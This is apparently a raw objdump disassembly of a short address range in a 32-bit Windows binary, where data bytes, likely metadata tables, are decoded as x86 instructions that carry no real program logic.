  4079fc:	00 00                	add    %al,(%eax)
  4079fe:	01 00                	add    %eax,(%eax)
  407a00:	90                   	nop
  407a01:	0a 00                	or     (%eax),%al
  407a03:	00 01                	add    %al,(%ecx)
  407a05:	00 e9                	add    %ch,%cl
  407a07:	04 00                	add    $0x0,%al
  407a09:	00 01                	add    %al,(%ecx)
  407a0b:	00 a1 0a 00 00 01    	add    %ah,0x100000a(%ecx)
  407a11:	00 7d 09             	add    %bh,0x9(%ebp)
  407a14:	00 00                	add    %al,(%eax)
  407a16:	02 00                	add    (%eax),%al
  407a18:	b4 0a                	mov    $0xa,%ah
  407a1a:	00 00                	add    %al,(%eax)
  407a1c:	01 00                	add    %eax,(%eax)
  407a1e:	b4 0a                	mov    $0xa,%ah
  407a20:	00 00                	add    %al,(%eax)
  407a22:	01 00                	add    %eax,(%eax)
  407a24:	39 09                	cmp    %ecx,(%ecx)
  407a26:	00 00                	add    %al,(%eax)
  407a28:	01 00                	add    %eax,(%eax)
  407a2a:	39 09                	cmp    %ecx,(%ecx)
  407a2c:	00 00                	add    %al,(%eax)
  407a2e:	01 00                	add    %eax,(%eax)
  407a30:	39 09                	cmp    %ecx,(%ecx)
  407a32:	00 00                	add    %al,(%eax)
  407a34:	01 00                	add    %eax,(%eax)
  407a36:	39 09                	cmp    %ecx,(%ecx)
  407a38:	00 00                	add    %al,(%eax)
  407a3a:	01 00                	add    %eax,(%eax)
  407a3c:	26 0b 00             	or     %es:(%eax),%eax
  407a3f:	00 02                	add    %al,(%edx)
  407a41:	00 33                	add    %dh,(%ebx)
  407a43:	0b 00                	or     (%eax),%eax
  407a45:	00 01                	add    %al,(%ecx)
  407a47:	00 ae 06 00 00 02    	add    %ch,0x2000006(%esi)
  407a4d:	00 b4 06 00 00 03 00 	add    %dh,0x30000(%esi,%eax,1)
  407a54:	bb 06 00 00 04       	mov    $0x4000006,%ebx
  407a59:	00 5a 0b             	add    %bl,0xb(%edx)
  407a5c:	00 00                	add    %al,(%eax)
  407a5e:	05 00 6b 0b 00       	add    $0xb6b00,%eax
  407a63:	00 01                	add    %al,(%ecx)
  407a65:	00 88 0b 00 00 01    	add    %cl,0x100000b(%eax)
  407a6b:	00 ae 06 00 00 02    	add    %ch,0x2000006(%esi)
  407a71:	00 b4 06 00 00 03 00 	add    %dh,0x30000(%esi,%eax,1)
  407a78:	bb 06 00 00 01       	mov    $0x1000006,%ebx
  407a7d:	00 26                	add    %ah,(%esi)
  407a7f:	0b 00                	or     (%eax),%eax
  407a81:	00 02                	add    %al,(%edx)
  407a83:	00 33                	add    %dh,(%ebx)
  407a85:	0b 00                	or     (%eax),%eax
  407a87:	00 01                	add    %al,(%ecx)
  407a89:	00 5a 0b             	add    %bl,0xb(%edx)
  407a8c:	00 00                	add    %al,(%eax)
  407a8e:	02 00                	add    (%eax),%al
  407a90:	6b 0b 00             	imul   $0x0,(%ebx),%ecx
  407a93:	00 01                	add    %al,(%ecx)
  407a95:	00 88 0b 09 00 4a    	add    %cl,0x4a00090b(%eax)
  407a9b:	01 13                	add    %edx,(%ebx)
  407a9d:	00 b1 00 4a 01 5f    	add    %dh,0x5f014a00(%ecx)
  407aa3:	02 c1                	add    %cl,%al
  407aa5:	00 4a 01             	add    %cl,0x1(%edx)
  407aa8:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa9:	02 11                	add    (%ecx),%dl
  407aab:	00 4a 01             	add    %cl,0x1(%edx)
  407aae:	13 00                	adc    (%eax),%eax
  407ab0:	c9                   	leave
  407ab1:	00 4a 01             	add    %cl,0x1(%edx)
  407ab4:	13 00                	adc    (%eax),%eax
  407ab6:	24 00                	and    $0x0,%al
  407ab8:	4a                   	dec    %edx
  407ab9:	01 13                	add    %edx,(%ebx)
  407abb:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407abe:	4a                   	dec    %edx
  407abf:	01 13                	add    %edx,(%ebx)
  407ac1:	00 34 00             	add    %dh,(%eax,%eax,1)
  407ac4:	4a                   	dec    %edx
  407ac5:	01 13                	add    %edx,(%ebx)
  407ac7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  407aca:	4a                   	dec    %edx
  407acb:	01 13                	add    %edx,(%ebx)
  407acd:	00 24 00             	add    %ah,(%eax,%eax,1)
  407ad0:	9c                   	pushf
  407ad1:	02 8b 00 2c 00 9c    	add    -0x63ffd400(%ebx),%cl
  407ad7:	02 8b 00 34 00 9c    	add    -0x63ffcc00(%ebx),%cl
  407add:	02 8b 00 3c 00 9c    	add    -0x63ffc400(%ebx),%cl
  407ae3:	02 8b 00 d1 00 4a    	add    0x4a00d100(%ebx),%cl
  407ae9:	01 13                	add    %edx,(%ebx)
  407aeb:	00 d9                	add    %bl,%cl
  407aed:	00 4a 01             	add    %cl,0x1(%edx)
  407af0:	13 00                	adc    (%eax),%eax
  407af2:	e1 00                	loope  0x407af4
  407af4:	4a                   	dec    %edx
  407af5:	01 bd 02 e9 00 53    	add    %edi,0x5300e902(%ebp)
  407afb:	0d 08 03 19 00       	or     $0x190308,%eax
  407b00:	3f                   	aas
  407b01:	02 63 00             	add    0x0(%ebx),%ah
  407b04:	19 00                	sbb    %eax,(%eax)
  407b06:	48                   	dec    %eax
  407b07:	02 68 00             	add    0x0(%eax),%ch
  407b0a:	29 00                	sub    %eax,(%eax)
  407b0c:	74 0d                	je     0x407b1b
  407b0e:	15 03 19 00 61       	adc    $0x61001903,%eax
  407b13:	02 71 00             	add    0x0(%ecx),%dh
  407b16:	f9                   	stc
  407b17:	00 90 0d 25 03 19    	add    %dl,0x1903250d(%eax)
  407b1d:	00 4a 01             	add    %cl,0x1(%edx)
  407b20:	13 00                	adc    (%eax),%eax
  407b22:	01 01                	add    %eax,(%ecx)
  407b24:	4a                   	dec    %edx
  407b25:	01 35 03 44 00 ac    	add    %esi,0xac004403
  407b2b:	02 90 00 09 01 4a    	add    0x4a010900(%eax),%dl
  407b31:	01 b0 03 11 01 4a    	add    %esi,0x4a011103(%eax)
  407b37:	01 13                	add    %edx,(%ebx)
  407b39:	00 19                	add    %bl,(%ecx)
  407b3b:	01 4a 01             	add    %ecx,0x1(%edx)
  407b3e:	13 00                	adc    (%eax),%eax
  407b40:	21 01                	and    %eax,(%ecx)
  407b42:	2a 0e                	sub    (%esi),%cl
  407b44:	bb 03 29 01 40       	mov    $0x40012903,%ebx
  407b49:	0e                   	push   %cs
  407b4a:	14 02                	adc    $0x2,%al
  407b4c:	31 01                	xor    %eax,(%ecx)
  407b4e:	4f                   	dec    %edi
  407b4f:	0e                   	push   %cs
  407b50:	c0 03 39             	rolb   $0x39,(%ebx)
  407b53:	01 4a 01             	add    %ecx,0x1(%edx)
  407b56:	bd 02 41 01 4a       	mov    $0x4a014102,%ebp
  407b5b:	01 13                	add    %edx,(%ebx)
  407b5d:	00 59 00             	add    %bl,0x0(%ecx)
  407b60:	e4 02                	in     $0x2,%al
  407b62:	06                   	push   %es
  407b63:	04 21                	add    $0x21,%al
  407b65:	01 61 02             	add    %esp,0x2(%ecx)
  407b68:	0b 04 69             	or     (%ecx,%ebp,2),%eax
  407b6b:	01 ff                	add    %edi,%edi
  407b6d:	0e                   	push   %cs
  407b6e:	14 02                	adc    $0x2,%al
  407b70:	71 01                	jno    0x407b73
  407b72:	26 0f 10 04 69       	movups %es:(%ecx,%ebp,2),%xmm0
  407b77:	01 36                	add    %esi,(%esi)
  407b79:	0f 06                	clts
  407b7b:	04 71                	add    $0x71,%al
  407b7d:	01 3b                	add    %edi,(%ebx)
  407b7f:	0f 17 00             	movhps %xmm0,(%eax)
  407b82:	31 01                	xor    %eax,(%ecx)
  407b84:	4f                   	dec    %edi
  407b85:	0e                   	push   %cs
  407b86:	17                   	pop    %ss
  407b87:	04 51                	add    $0x51,%al
  407b89:	01 4a 01             	add    %ecx,0x1(%edx)
  407b8c:	bd 02 51 01 5b       	mov    $0x5b015102,%ebp
  407b91:	0f 1e 04 79          	nopl   (%ecx,%edi,2)
  407b95:	01 69 0f             	add    %ebp,0xf(%ecx)
  407b98:	71 00                	jno    0x407b9a
  407b9a:	81 01 80 0f 9f 01    	addl   $0x19f0f80,(%ecx)
  407ba0:	81 01 87 0f 24 04    	addl   $0x4240f87,(%ecx)
  407ba6:	89 01                	mov    %eax,(%ecx)
  407ba8:	80 0f 9f             	orb    $0x9f,(%edi)
  407bab:	01 51 01             	add    %edx,0x1(%ecx)
  407bae:	9c                   	pushf
  407baf:	0f 13 00             	movlps %xmm0,(%eax)
  407bb2:	89 01                	mov    %eax,(%ecx)
  407bb4:	a3 0f 08 02 89       	mov    %eax,0x8902080f
  407bb9:	01 b0 0f 17 01 61    	add    %esi,0x6101170f(%eax)
  407bbf:	01 4a 01             	add    %ecx,0x1(%edx)
  407bc2:	bd 02 61 01 d1       	mov    $0xd1016102,%ebp
  407bc7:	0f 2b 04 21          	movntps %xmm0,(%ecx,%eiz,1)
  407bcb:	01 e1                	add    %esp,%ecx
  407bcd:	0f 9f 01             	setg   (%ecx)
  407bd0:	99                   	cltd
  407bd1:	01 f0                	add    %esi,%eax
  407bd3:	0f 14 02             	unpcklps (%edx),%xmm0
  407bd6:	31 01                	xor    %eax,(%ecx)
  407bd8:	4f                   	dec    %edi
  407bd9:	0e                   	push   %cs
  407bda:	32 04 61             	xor    (%ecx,%eiz,2),%al
  407bdd:	01 0c 10             	add    %ecx,(%eax,%edx,1)
  407be0:	bd 02 59 01 1a       	mov    $0x1a015902,%ebp
  407be5:	10 38                	adc    %bh,(%eax)
  407be7:	04 59                	add    $0x59,%al
  407be9:	01 20                	add    %esp,(%eax)
  407beb:	10 13                	adc    %dl,(%ebx)
  407bed:	00 a1 01 6a 10 41    	add    %ah,0x41106a01(%ecx)
  407bf3:	04 a9                	add    $0xa9,%al
  407bf5:	01 83 10 47 04 b1    	add    %eax,-0x4efbb8f0(%ebx)
  407bfb:	01 93 10 4d 04 b1    	add    %edx,-0x4efbb2f0(%ebx)
  407c01:	01 ab 0a 55 04 69    	add    %ebp,0x6904550a(%ebx)
  407c07:	01 ac 10 5b 04 31 01 	add    %ebp,0x131045b(%eax,%edx,1)
  407c0e:	4f                   	dec    %edi
  407c0f:	0e                   	push   %cs
  407c10:	62 04 29             	bound  %eax,(%ecx,%ebp,1)
  407c13:	01 ba 10 6a 04 c9    	add    %edi,-0x36fb95f0(%edx)
  407c19:	01 de                	add    %ebx,%esi
  407c1b:	10 70 04             	adc    %dh,0x4(%eax)
  407c1e:	21 01                	and    %eax,(%ecx)
  407c20:	e6 10                	out    %al,$0x10
  407c22:	81 04 c9 01 f1 10 88 	addl   $0x8810f101,(%ecx,%ecx,8)
  407c29:	04 c9                	add    $0xc9,%al
  407c2b:	01 00                	add    %eax,(%eax)
  407c2d:	11 99 04 71 00 4a    	adc    %ebx,0x4a007104(%ecx)
  407c33:	01 ab 04 d9 01 4a    	add    %ebp,0x4a01d904(%ebx)
  407c39:	01 2b                	add    %ebp,(%ebx)
  407c3b:	02 59 00             	add    0x0(%ecx),%bl
  407c3e:	4a                   	dec    %edx
  407c3f:	01 b3 04 59 00 1a    	add    %esi,0x1a005904(%ebx)
  407c45:	10 13                	adc    %dl,(%ebx)
  407c47:	00 59 00             	add    %bl,0x0(%ecx)
  407c4a:	1e                   	push   %ds
  407c4b:	11 13                	adc    %edx,(%ebx)
  407c4d:	00 61 01             	add    %ah,0x1(%ecx)
  407c50:	4a                   	dec    %edx
  407c51:	01 13                	add    %edx,(%ebx)
  407c53:	00 61 01             	add    %ah,0x1(%ecx)
  407c56:	23 11                	and    (%ecx),%edx
  407c58:	bd 02 59 01 30       	mov    $0x30015902,%ebp
  407c5d:	11 ea                	adc    %ebp,%edx
  407c5f:	04 59                	add    $0x59,%al
  407c61:	01 50 11             	add    %edx,0x11(%eax)
  407c64:	f0 04 e1             	lock add $0xe1,%al
  407c67:	01 5f 11             	add    %ebx,0x11(%edi)
  407c6a:	71 00                	jno    0x407c6c
  407c6c:	99                   	cltd
  407c6d:	01 6e 11             	add    %ebp,0x11(%esi)
  407c70:	14 02                	adc    $0x2,%al
  407c72:	69 01 7a 11 e5 00    	imul   $0xe5117a,(%ecx),%eax
  407c78:	e9 01 4a 01 13       	jmp    0x1341c67e
  407c7d:	00 e9                	add    %ch,%cl
  407c7f:	01 98 11 01 05 31    	add    %ebx,0x31050111(%eax)
  407c85:	01 a7 11 06 05 f1    	add    %esp,-0xefaf9ef(%edi)
  407c8b:	01 4a 01             	add    %ecx,0x1(%edx)
  407c8e:	13 00                	adc    (%eax),%eax
  407c90:	f1                   	int1
  407c91:	01 bd 11 71 00 31    	add    %edi,0x31007111(%ebp)
  407c97:	01 cc                	add    %ecx,%esp
  407c99:	11 71 00             	adc    %esi,0x0(%ecx)
  407c9c:	01 02                	add    %eax,(%edx)
  407c9e:	4a                   	dec    %edx
  407c9f:	01 bd 02 09 02 2a    	add    %edi,0x2a020902(%ebp)
  407ca5:	12 10                	adc    (%eax),%dl
  407ca7:	05 f9 01 38 12       	add    $0x123801f9,%eax
  407cac:	16                   	push   %ss
  407cad:	05 c9 01 44 12       	add    $0x124401c9,%eax
  407cb2:	1a 05 11 02 5b 12    	sbb    0x125b0211,%al
  407cb8:	23 05 31 01 69 12    	and    0x12690131,%eax
  407cbe:	71 00                	jno    0x407cc0
  407cc0:	f9                   	stc
  407cc1:	01 7a 12             	add    %edi,0x12(%edx)
  407cc4:	2a 05 19 02 8f 12    	sub    0x128f0219,%al
  407cca:	13 00                	adc    (%eax),%eax
  407ccc:	59                   	pop    %ecx
  407ccd:	01 97 12 3d 05 21    	add    %edx,0x21053d12(%edi)
  407cd3:	02 a9 12 68 00 79    	add    0x79006812(%ecx),%ch
  407cd9:	00 4a 01             	add    %cl,0x1(%edx)
  407cdc:	13 00                	adc    (%eax),%eax
  407cde:	79 00                	jns    0x407ce0
  407ce0:	b1 12                	mov    $0x12,%cl
  407ce2:	4b                   	dec    %ebx
  407ce3:	05 29 02 c1 12       	add    $0x12c10229,%eax
  407ce8:	2a 05 31 02 4a 01    	sub    0x14a0231,%al
  407cee:	13 00                	adc    (%eax),%eax
  407cf0:	39 02                	cmp    %eax,(%edx)
  407cf2:	4a                   	dec    %edx
  407cf3:	01 bd 02 49 00 4a    	add    %edi,0x4a004902(%ebp)
  407cf9:	01 b0 03 31 01 26    	add    %esi,0x26013103(%eax)
  407cff:	13 51 05             	adc    0x5(%ecx),%edx
  407d02:	79 00                	jns    0x407d04
  407d04:	b1 12                	mov    $0x12,%cl
  407d06:	58                   	pop    %eax
  407d07:	05 51 02 30 13       	add    $0x13300251,%eax
  407d0c:	5d                   	pop    %ebp
  407d0d:	05 41 02 61 02       	add    $0x2610241,%eax
  407d12:	71 00                	jno    0x407d14
  407d14:	31 00                	xor    %eax,(%eax)
  407d16:	4a                   	dec    %edx
  407d17:	01 7c 05 39          	add    %edi,0x39(%ebp,%eax,1)
  407d1b:	00 4a 01             	add    %cl,0x1(%edx)
  407d1e:	13 00                	adc    (%eax),%eax
  407d20:	31 00                	xor    %eax,(%eax)
  407d22:	7a 13                	jp     0x407d37
  407d24:	89 05 31 00 90 13    	mov    %eax,0x13900031
  407d2a:	89 05 31 00 a3 13    	mov    %eax,0x13a30031
  407d30:	8e 05 99 00 4a 01    	mov    0x14a0099,%es
  407d36:	2b 02                	sub    (%edx),%eax
  407d38:	31 00                	xor    %eax,(%eax)
  407d3a:	cf                   	iret
  407d3b:	04 94                	add    $0x94,%al
  407d3d:	05 59 02 4a 01       	add    $0x14a0259,%eax
  407d42:	2b 02                	sub    (%edx),%eax
  407d44:	41                   	inc    %ecx
  407d45:	00 4a 01             	add    %cl,0x1(%edx)
  407d48:	a3 05 89 02 c7       	mov    %eax,0xc7028905
  407d4d:	13 2a                	adc    (%edx),%ebp
  407d4f:	05 69 01 cb 13       	add    $0x13cb0169,%eax
  407d54:	d5 00                	aad    $0x0
  407d56:	31 01                	xor    %eax,(%ecx)
  407d58:	d8 13                	fcoms  (%ebx)
  407d5a:	b7 05                	mov    $0x5,%bh
  407d5c:	69 01 f0 13 bd 05    	imul   $0x5bd13f0,(%ecx),%eax
  407d62:	91                   	xchg   %eax,%ecx
  407d63:	02 fe                	add    %dh,%bh
  407d65:	13 71 00             	adc    0x0(%ecx),%esi
  407d68:	69 01 0e 14 9f 00    	imul   $0x9f140e,(%ecx),%eax
  407d6e:	c1 01 61             	roll   $0x61,(%ecx)
  407d71:	02 71 00             	add    0x0(%ecx),%dh
  407d74:	31 01                	xor    %eax,(%ecx)
  407d76:	4f                   	dec    %edi
  407d77:	0e                   	push   %cs
  407d78:	c3                   	ret
  407d79:	05 a1 02 41 14       	add    $0x144102a1,%eax
  407d7e:	d3 05 99 02 61 02    	roll   %cl,0x2610299
  407d84:	01 05 a9 02 7d 14    	add    %eax,0x147d02a9
  407d8a:	ed                   	in     (%dx),%eax
  407d8b:	05 b1 02 4a 01       	add    $0x14a02b1,%eax
  407d90:	f3 05 b1 02 ac 14    	repz add $0x14ac02b1,%eax
  407d96:	fa                   	cli
  407d97:	05 69 01 00 15       	add    $0x15000169,%eax
  407d9c:	d5 00                	aad    $0x0
  407d9e:	01 02                	add    %eax,(%edx)
  407da0:	4a                   	dec    %edx
  407da1:	01 6e 02             	add    %ebp,0x2(%esi)
  407da4:	61                   	popa
  407da5:	00 4a 01             	add    %cl,0x1(%edx)
  407da8:	13 00                	adc    (%eax),%eax
  407daa:	01 02                	add    %eax,(%edx)
  407dac:	10 15 09 06 c9 02    	adc    %dl,0x2c90609
  407db2:	2a 12                	sub    (%edx),%dl
  407db4:	0f 06                	clts
  407db6:	d1 02                	roll   $1,(%edx)
  407db8:	38 12                	cmp    %dl,(%edx)
  407dba:	15 06 c1 02 14       	adc    $0x1402c106,%eax
  407dbf:	15 1b 06 61 00       	adc    $0x61061b,%eax
  407dc4:	1d 15 20 06 d1       	sbb    $0xd1062015,%eax
  407dc9:	02 7a 12             	add    0x12(%edx),%bh
  407dcc:	2a 05 61 00 61 02    	sub    0x2610061,%al
  407dd2:	71 00                	jno    0x407dd4
  407dd4:	31 01                	xor    %eax,(%ecx)
  407dd6:	24 15                	and    $0x15,%al
  407dd8:	68 00 61 00 24       	push   $0x24006100
  407ddd:	15 68 00 31 01       	adc    $0x1310068,%eax
  407de2:	2f                   	das
  407de3:	15 26 06 31 01       	adc    $0x1310626,%eax
  407de8:	56                   	push   %esi
  407de9:	15 99 00 d9 02       	adc    $0x2d90099,%eax
  407dee:	4a                   	dec    %edx
  407def:	01 bd 02 01 02 4a    	add    %edi,0x4a020102(%ebp)
  407df5:	01 3e                	add    %edi,(%esi)
  407df7:	06                   	push   %es
  407df8:	11 02                	adc    %eax,(%edx)
  407dfa:	5c                   	pop    %esp
  407dfb:	15 45 06 e1 02       	adc    $0x2e10645,%eax
  407e00:	4a                   	dec    %edx
  407e01:	01 bd 02 e1 02 10    	add    %edi,0x1002e102(%ebp)
  407e07:	15 13 00 a1 01       	adc    $0x1a10013,%eax
  407e0c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e0d:	15 66 06 f1 01       	adc    $0x1f10666,%eax
  407e12:	77 15                	ja     0x407e29
  407e14:	6c                   	insb   (%dx),%es:(%edi)
  407e15:	06                   	push   %es
  407e16:	f1                   	int1
  407e17:	02 a1 15 70 06 f9    	add    -0x6f98feb(%ecx),%ah
  407e1d:	02 aa 15 75 06 01    	add    0x1067515(%edx),%ch
  407e23:	03 61 02             	add    0x2(%ecx),%esp
  407e26:	71 00                	jno    0x407e28
  407e28:	31 01                	xor    %eax,(%ecx)
  407e2a:	b7 15                	mov    $0x15,%bh
  407e2c:	26 06                	es push %es
  407e2e:	31 00                	xor    %eax,(%eax)
  407e30:	be 15 84 06 39       	mov    $0x39068415,%esi
  407e35:	00 c9                	add    %cl,%cl
  407e37:	15 8a 06 21 01       	adc    $0x121068a,%eax
  407e3c:	d1 15 8f 06 09 03    	rcll   $1,0x309068f
  407e42:	8f                   	(bad)
  407e43:	12 13                	adc    (%ebx),%dl
  407e45:	00 39                	add    %bh,(%ecx)
  407e47:	00 df                	add    %bl,%bh
  407e49:	15 94 06 39 00       	adc    $0x390694,%eax
  407e4e:	e9 15 99 06 39       	jmp    0x39471768
  407e53:	00 24 15 a1 06 11 03 	add    %ah,0x31106a1(,%edx,1)
  407e5a:	4a                   	dec    %edx
  407e5b:	01 2b                	add    %ebp,(%ebx)
  407e5d:	02 59 00             	add    0x0(%ecx),%bl
  407e60:	4a                   	dec    %edx
  407e61:	01 a5 06 19 03 1a    	add    %esp,0x1a031906(%ebp)
  407e67:	16                   	push   %ss
  407e68:	ea 00 21 03 3e 16 bc 	ljmp   $0xbc16,$0x3e032100
  407e6f:	06                   	push   %es
  407e70:	21 01                	and    %eax,(%ecx)
  407e72:	61                   	popa
  407e73:	02 e1                	add    %cl,%ah
  407e75:	01 31                	add    %esi,(%ecx)
  407e77:	00 4f 16             	add    %cl,0x16(%edi)
  407e7a:	c3                   	ret
  407e7b:	06                   	push   %es
  407e7c:	31 00                	xor    %eax,(%eax)
  407e7e:	54                   	push   %esp
  407e7f:	16                   	push   %ss
  407e80:	94                   	xchg   %eax,%esp
  407e81:	05 21 03 36 0f       	add    $0xf360321,%eax
  407e86:	ea 00 31 00 f4 04 84 	ljmp   $0x8404,$0xf4003100
  407e8d:	06                   	push   %es
  407e8e:	41                   	inc    %ecx
  407e8f:	00 8f 12 13 00 09    	add    %cl,0x9001312(%edi)
  407e95:	03 5e 16             	add    0x16(%esi),%ebx
  407e98:	13 00                	adc    (%eax),%eax
  407e9a:	31 00                	xor    %eax,(%eax)
  407e9c:	5e                   	pop    %esi
  407e9d:	16                   	push   %ss
  407e9e:	13 00                	adc    (%eax),%eax
  407ea0:	31 00                	xor    %eax,(%eax)
  407ea2:	8f                   	(bad)
  407ea3:	12 13                	adc    (%ebx),%dl
  407ea5:	00 31                	add    %dh,(%ecx)
  407ea7:	03 67 16             	add    0x16(%edi),%esp
  407eaa:	17                   	pop    %ss
  407eab:	00 59 03             	add    %bl,0x3(%ecx)
  407eae:	26 13 f3             	es adc %ebx,%esi
  407eb1:	06                   	push   %es
  407eb2:	69 03 17 17 17 00    	imul   $0x171717,(%ebx),%eax
  407eb8:	31 00                	xor    %eax,(%eax)
  407eba:	2e 17                	cs pop %ss
  407ebc:	fe 06                	incb   (%esi)
  407ebe:	79 03                	jns    0x407ec3
  407ec0:	3f                   	aas
  407ec1:	17                   	pop    %ss
  407ec2:	08 02                	or     %al,(%edx)
  407ec4:	81 03 64 17 05 07    	addl   $0x7051764,(%ebx)
  407eca:	81 03 8f 17 0a 07    	addl   $0x70a178f,(%ebx)
  407ed0:	81 03 a4 17 06 04    	addl   $0x40617a4,(%ebx)
  407ed6:	99                   	cltd
  407ed7:	01 bf 17 d5 00 99    	add    %edi,-0x66ff2ae9(%edi)
  407edd:	01 cb                	add    %ecx,%ebx
  407edf:	17                   	pop    %ss
  407ee0:	c0 03 e9             	rolb   $0xe9,(%ebx)
  407ee3:	01 d3                	add    %edx,%ebx
  407ee5:	17                   	pop    %ss
  407ee6:	6e                   	outsb  %ds:(%esi),(%dx)
  407ee7:	02 59 01             	add    0x1(%ecx),%bl
  407eea:	1a 10                	sbb    (%eax),%dl
  407eec:	11 07                	adc    %eax,(%edi)
  407eee:	29 01                	sub    %eax,(%ecx)
  407ef0:	ec                   	in     (%dx),%al
  407ef1:	17                   	pop    %ss
  407ef2:	18 07                	sbb    %al,(%edi)
  407ef4:	59                   	pop    %ecx
  407ef5:	00 f2                	add    %dh,%dl
  407ef7:	17                   	pop    %ss
  407ef8:	13 00                	adc    (%eax),%eax
  407efa:	59                   	pop    %ecx
  407efb:	00 1a                	add    %bl,(%edx)
  407efd:	10 22                	adc    %ah,(%edx)
  407eff:	07                   	pop    %es
  407f00:	89 01                	mov    %eax,(%ecx)
  407f02:	f8                   	clc
  407f03:	17                   	pop    %ss
  407f04:	14 02                	adc    $0x2,%al
  407f06:	89 01                	mov    %eax,(%ecx)
  407f08:	04 18                	add    $0x18,%al
  407f0a:	27                   	daa
  407f0b:	07                   	pop    %es
  407f0c:	49                   	dec    %ecx
  407f0d:	01 11                	add    %edx,(%ecx)
  407f0f:	18 71 00             	sbb    %dh,0x0(%ecx)
  407f12:	b1 01                	mov    $0x1,%cl
  407f14:	1d 18 bd 02 99       	sbb    $0x9902bd18,%eax
  407f19:	03 31                	add    (%ecx),%esi
  407f1b:	18 2d 07 99 03 43    	sbb    %ch,0x43039907
  407f21:	18 33                	sbb    %dh,(%ebx)
  407f23:	07                   	pop    %es
  407f24:	49                   	dec    %ecx
  407f25:	03 4e 18             	add    0x18(%esi),%ecx
  407f28:	68 00 49 03 58       	push   $0x58034900
  407f2d:	18 68 00             	sbb    %ch,0x0(%eax)
  407f30:	51                   	push   %ecx
  407f31:	03 4a 01             	add    0x1(%edx),%ecx
  407f34:	39 07                	cmp    %eax,(%edi)
  407f36:	39 03                	cmp    %eax,(%ebx)
  407f38:	8c 18                	mov    %ds,(%eax)
  407f3a:	42                   	inc    %edx
  407f3b:	07                   	pop    %es
  407f3c:	a9 03 4e 18 68       	test   $0x68184e03,%eax
  407f41:	00 a9 03 58 18 68    	add    %ch,0x68185803(%ecx)
  407f47:	00 41 03             	add    %al,0x3(%ecx)
  407f4a:	4a                   	dec    %edx
  407f4b:	01 4b 07             	add    %ecx,0x7(%ebx)
  407f4e:	39 03                	cmp    %eax,(%ebx)
  407f50:	a9 18 51 07 51       	test   $0x51075118,%eax
  407f55:	03 4a 01             	add    0x1(%edx),%ecx
  407f58:	4b                   	dec    %ebx
  407f59:	07                   	pop    %es
  407f5a:	49                   	dec    %ecx
  407f5b:	03 4a 01             	add    0x1(%edx),%ecx
  407f5e:	5f                   	pop    %edi
  407f5f:	07                   	pop    %es
  407f60:	39 03                	cmp    %eax,(%ebx)
  407f62:	c5 18                	lds    (%eax),%ebx
  407f64:	67 07                	addr16 pop %es
  407f66:	c1 03 db             	roll   $0xdb,(%ebx)
  407f69:	18 77 07             	sbb    %dh,0x7(%edi)
  407f6c:	a9 03 e4 18 7d       	test   $0x7d18e403,%eax
  407f71:	07                   	pop    %es
  407f72:	79 03                	jns    0x407f77
  407f74:	e9 18 0e 02 39       	jmp    0x39428d91
  407f79:	03 8f 12 13 00 a9    	add    -0x56ffecee(%edi),%ecx
  407f7f:	03 8f 12 13 00 d1    	add    -0x2effecee(%edi),%ecx
  407f85:	03 1f                	add    (%edi),%ebx
  407f87:	19 cb                	sbb    %ecx,%ebx
  407f89:	07                   	pop    %es
  407f8a:	d1 03                	roll   $1,(%ebx)
  407f8c:	3a 19                	cmp    (%ecx),%bl
  407f8e:	d1 07                	roll   $1,(%edi)
  407f90:	d9 03                	flds   (%ebx)
  407f92:	3f                   	aas
  407f93:	19 d9                	sbb    %ebx,%ecx
  407f95:	07                   	pop    %es
  407f96:	e1 03                	loope  0x407f9b
  407f98:	53                   	push   %ebx
  407f99:	19 71 00             	sbb    %esi,0x0(%ecx)
  407f9c:	29 00                	sub    %eax,(%eax)
  407f9e:	5c                   	pop    %esp
  407f9f:	19 df                	sbb    %ebx,%edi
  407fa1:	07                   	pop    %es
  407fa2:	11 02                	adc    %eax,(%edx)
  407fa4:	67 19 e6             	addr16 sbb %esp,%esi
  407fa7:	07                   	pop    %es
  407fa8:	79 03                	jns    0x407fad
  407faa:	a9 12 bb 03 31       	test   $0x3103bb12,%eax
  407faf:	01 8b 19 06 05 79    	add    %ecx,0x79050619(%ebx)
  407fb5:	03 e1                	add    %ecx,%esp
  407fb7:	0f 9f 01             	setg   (%ecx)
  407fba:	81 00 a0 19 04 08    	addl   $0x80419a0,(%eax)
  407fc0:	f1                   	int1
  407fc1:	03 4a 01             	add    0x1(%edx),%ecx
  407fc4:	13 00                	adc    (%eax),%eax
  407fc6:	f1                   	int1
  407fc7:	03 1a                	add    (%edx),%ebx
  407fc9:	10 13                	adc    %dl,(%ebx)
  407fcb:	00 f1                	add    %dh,%cl
  407fcd:	03 ac 19 0a 08 81 00 	add    0x81080a(%ecx,%ebx,1),%ebp
  407fd4:	b8 19 0f 08 54       	mov    $0x54080f19,%eax
  407fd9:	00 4a 01             	add    %cl,0x1(%edx)
  407fdc:	13 00                	adc    (%eax),%eax
  407fde:	54                   	push   %esp
  407fdf:	00 e9                	add    %ch,%cl
  407fe1:	19 33                	sbb    %esi,(%ebx)
  407fe3:	08 59 01             	or     %bl,0x1(%ecx)
  407fe6:	ed                   	in     (%dx),%eax
  407fe7:	19 39                	sbb    %edi,(%ecx)
  407fe9:	08 59 01             	or     %bl,0x1(%ecx)
  407fec:	fa                   	cli
  407fed:	19 71 00             	sbb    %esi,0x0(%ecx)
  407ff0:	31 01                	xor    %eax,(%ecx)
  407ff2:	0e                   	push   %cs
  407ff3:	1a 9f 01 5c 00 4a    	sbb    0x4a005c01(%edi),%bl
  407ff9:	01 2b                	add    %ebp,(%ebx)
  407ffb:	02 09                	add    (%ecx),%cl
  407ffd:	04 54                	add    $0x54,%al
  407fff:	1a 48 08             	sbb    0x8(%eax),%cl
  408002:	29 04 82             	sub    %eax,(%edx,%eax,4)
  408005:	1a 76 08             	sbb    0x8(%esi),%dh
  408008:	19 04 89             	sbb    %eax,(%ecx,%ecx,4)
  40800b:	1a bd 02 19 04 97    	sbb    -0x68fbe6fe(%ebp),%bh
  408011:	1a b0 03 19 04 ad    	sbb    -0x52fbe6fd(%eax),%dh
  408017:	1a 89 05 19 04 b9    	sbb    -0x46fbe6fb(%ecx),%cl
  40801d:	1a bd 02 19 04 d0    	sbb    -0x2ffbe6fe(%ebp),%bh
  408023:	1a 7d 08             	sbb    0x8(%ebp),%bh
  408026:	59                   	pop    %ecx
